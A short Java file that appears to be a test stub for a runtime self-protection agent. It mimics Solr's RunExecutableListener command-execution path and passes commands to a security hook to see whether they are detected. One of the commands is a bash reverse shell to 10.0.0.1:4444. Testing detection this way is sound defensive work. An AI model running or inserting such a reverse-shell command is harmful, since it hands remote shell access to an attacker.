package org.apache.solr.core;

import io.ohmyrasp.agent.java8.Java8RaspHooks;

public final class RunExecutableListener {
  private RunExecutableListener() {}

  public static void invokeJava8TouchCommand() {
    Java8RaspHooks.beforeRuntimeExecArray(
        new String[] {"sh", "-c", "touch /tmp/ohmyrasp-solr12629-success"});
  }

  public static void invokeJava8ReverseShell() {
    Java8RaspHooks.beforeRuntimeExecArray(
        new String[] {"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"});
  }
}
